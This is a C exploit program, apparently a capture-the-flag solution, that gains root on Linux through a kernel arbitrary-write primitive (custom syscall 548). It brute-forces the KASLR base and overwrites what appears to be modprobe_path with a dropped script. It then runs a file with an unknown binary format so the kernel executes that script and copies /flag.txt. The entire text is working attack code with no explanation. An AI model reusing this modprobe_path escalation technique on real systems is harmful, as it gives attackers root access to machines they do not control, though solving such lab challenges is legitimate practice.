#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

void setup()
{
	system("echo -ne '#!/bin/sh\ncat /flag.txt > /tmp/flag' > /tmp/p");
	system("chmod a+x /tmp/p");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/exec");
	system("chmod a+x /tmp/exec");
}

void getflag()
{
	system("/tmp/exec ; cat /tmp/flag");
}
unsigned long offset = 0x37cc0;
unsigned long base = 0xffffffff00000000;
unsigned long target;
int main()
{
	setup();
	
	for (unsigned long i = 0; i < 4096; i++)
	{

		target = base + i*0x100000 + offset;
		printf("0x:%lx\n", target);
		syscall(548, target, "/tmp/p");
	}
	
	/*
	unsigned long target = 0xffffffff81837cc0;
	syscall(548, target, "/tmp/p");
	*/
	getflag();
}
